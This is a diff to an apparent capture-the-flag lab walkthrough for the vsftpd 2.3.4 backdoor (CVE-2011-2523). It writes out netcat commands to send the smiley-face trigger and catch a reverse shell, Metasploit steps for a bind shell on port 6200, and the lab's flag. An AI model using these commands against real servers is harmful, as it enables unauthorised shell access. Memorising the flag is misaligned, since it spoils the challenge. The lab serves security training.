@@ -39,14 +39,39 @@ Expected results:
 3. The banner `220 (vsFTPd 2.3.4)` is the historically backdoored
    version (CVE-2011-2523). This lab reproduces the same externally
    observable trigger: send a `USER` containing a smiley face `:)`.
-4. Trigger the backdoor and connect to the bind shell it opens on
-   **port 6200**:
+   Sending it opens **two** shell paths at once (pick either):
+
+   **Path A — manual, reverse shell (recommended: works from a public IP with many players):**
+   Start a listener first, then trigger:
+   ```bash
+   nc -lvnp 1234
+   ```
+   In another terminal:
    ```bash
    (printf 'USER backdoor:)\r\n'; sleep 1; printf 'QUIT\r\n'; sleep 1) | nc <TARGET_IP> 21
-   nc <TARGET_IP> 6200
    ```
-   Or with Metasploit: `use unix/ftp/vsftpd_234_backdoor`, set `RHOSTS`/`RPORT 21`, `run` — it sends the same trigger and connects to 6200 for you.
-5. In the resulting shell: `cat flag.txt` (or `whoami`, `pwd` first — you land in `/home/ftpsvc`).
+   The shell lands in the first terminal within a few seconds (the
+   server retries the callback for ~15s in case the listener isn't up
+   yet). To use a port other than 1234, append it right after the
+   smiley: `USER backdoor:)9001` and listen on that port instead.
+   This path always dials back the same IP that sent the trigger — it
+   cannot be redirected to a third-party address.
+
+   **Path B — Metasploit, real-CVE-style bind shell on port 6200:**
+   ```
+   use exploit/unix/ftp/vsftpd_234_backdoor
+   set RHOSTS <TARGET_IP>
+   set payload cmd/unix/interact
+   run
+   ```
+   `cmd/unix/interact` just wires the module straight into the bind
+   shell on 6200, so no `LHOST`/handler is needed. (The module's
+   default payload, `cmd/linux/http/x86/meterpreter_reverse_tcp`, also
+   works but needs a valid `LHOST` reachable from the target and a
+   separate handler — `cmd/unix/interact` is simpler for this box.)
+   Manual equivalent: trigger with `nc` as in Path A, then
+   `nc <TARGET_IP> 6200`.
+4. In the resulting shell: `cat flag.txt` (or `whoami`, `pwd` first — you land in `/home/ftpsvc`).
 
    **Flag:** `CTF{4LW4YS_CH3CK_0LD_CV3S_B3F0R3_M0V1NG_0N}`
 
